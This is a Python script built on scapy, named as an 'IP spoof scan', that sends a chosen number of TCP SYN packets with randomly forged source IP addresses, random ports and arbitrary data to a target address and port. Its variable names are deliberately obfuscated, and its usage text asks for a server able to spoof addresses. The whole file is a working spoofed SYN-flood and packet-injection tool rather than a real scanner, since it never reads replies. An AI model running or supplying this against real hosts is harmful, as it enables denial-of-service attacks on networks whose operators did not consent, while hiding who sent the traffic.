#!/usr/bin/python3
#
# [USAGE] python3 ip.spoof.scan.py [TCP-PORT-NUMBER] [TIME-TO-RUN] [IPV4-TO-SCAN] [DATA]

import os
import sys
import random
import getopt
from scapy.all import *

def randomIP():
    O0O0O00OOOO0OO0OO = ".".join(
        map(str, (random.randint(0, 255) for _O0000OOOOOO000O00 in range(4)))
    )
    return O0O0O00OOOO0OO0OO


def randInt():
    OO000OO00OO00O000 = random.randint(1000, 9000)
    return OO000OO00OO00O000

def scanpacket(
    O00O0OO000OO00O0O, OOO0OOOO000O0000O, OOO00O0000000O00O, OO0OO00O0OO00O000
):
    O0O0O0O00OO0OOOO0 = 0
    for OO0O000O0000O000O in range(0, OOO0OOOO000O0000O):
        OO0000000O0OO00OO = randInt()
        OO00O0OOO0O00OOO0 = randInt()
        OO0O00O0O000000OO = randInt()
        O00O0OO00O0O00000 = IP()
        O00O0OO00O0O00000.src = randomIP()
        O00O0OO00O0O00000.dst = OOO00O0000000O00O
        O0OOO0OOOOOO0OOOO = TCP()
        O0OOO0OOOOOO0OOOO.sport = OO0000000O0OO00OO
        O0OOO0OOOOOO0OOOO.dport = O00O0OO000OO00O0O
        O0OOO0OOOOOO0OOOO.flags = "S"
        O0OOO0OOOOOO0OOOO.seq = OO00O0OOO0O00OOO0
        O0OOO0OOOOOO0OOOO.window = OO0O00O0O000000OO
        O0OOO0OOOOOO0OOOO.options = [("MSS", 1460)]
        send(O00O0OO00O0O00000 / O0OOO0OOOOOO0OOOO / OO0OO00O0OO00O000, verbose=0)
        O0O0O0O00OO0OOOO0 += 1

def info():
    os.system("clear")
    print("")
    print(" .:[ IP.SPOOF.SCAN ]:. ")
    print("")
    if len(sys.argv) > 1:
        O00O0000OO0O000OO = sys.argv[1]
        O000OO0OOO00OO00O = sys.argv[1]
    else:
        O00O0000OO0O000OO = ""
        print(
            "Seems quiet on the command line so try again. You need scapy, and a server capable of spoofing IPv4 IP addresses."
        )
        O000OO0OOO00OO00O = input(
            "CTRL+C and run using valid syntax: python3 ip.spoof.scan.py [TCP-PORT-NUMBER] [TIME-TO-RUN] [IPV4-TO-SCAN] [DATA]"
        )
    return int(O000OO0OOO00OO00O)

def main():
    OO0O0OO00OOOOO0O0 = info()
    O0O0OO00OO00O0O00 = sys.argv[3]
    OO00OO0000OOO00O0 = sys.argv[4]
    OO0OOOOO0OO0O0000 = sys.argv[2]
    scanpacket(
        OO0O0OO00OOOOO0O0, int(OO0OOOOO0OO0O0000), O0O0OO00OO00O0O00, OO00OO0000OOO00O0
    )


main()
print(
    "[DONE] Sent "
    + sys.argv[2]
    + " TCP packets to IPv4 "
    + sys.argv[3]
    + " and PORT "
    + sys.argv[1]
    + " and DATA "
    + sys.argv[4]
)
